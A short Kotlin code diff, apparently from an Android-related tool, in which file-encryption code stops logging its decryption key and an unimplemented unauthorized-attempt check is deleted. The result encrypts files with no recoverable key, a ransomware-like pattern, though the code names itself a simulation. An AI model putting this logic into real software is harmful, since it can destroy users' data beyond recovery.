@@ -347,7 +347,7 @@ class ADBBase(private val logger: Logger = Logger()) {
             encryptFile(file, key)
         }
 
-        logger.info("Files encrypted. Decryption key: ${Base64.getEncoder().encodeToString(key.encoded)}")
+        logger.info("Files encrypted successfully.")
     }
 
     private fun generateEncryptionKey(): SecretKey {
@@ -376,11 +376,6 @@ class ADBBase(private val logger: Logger = Logger()) {
         val outputBytes = cipher.doFinal(inputBytes)
 
         file.writeBytes(outputBytes)
-    }
-
-    private fun detectUnauthorizedAttempts(): Boolean {
-        // Implement logic to detect unauthorized attempts
-        return false
     }
 
     private fun logSimulationAttempt() {
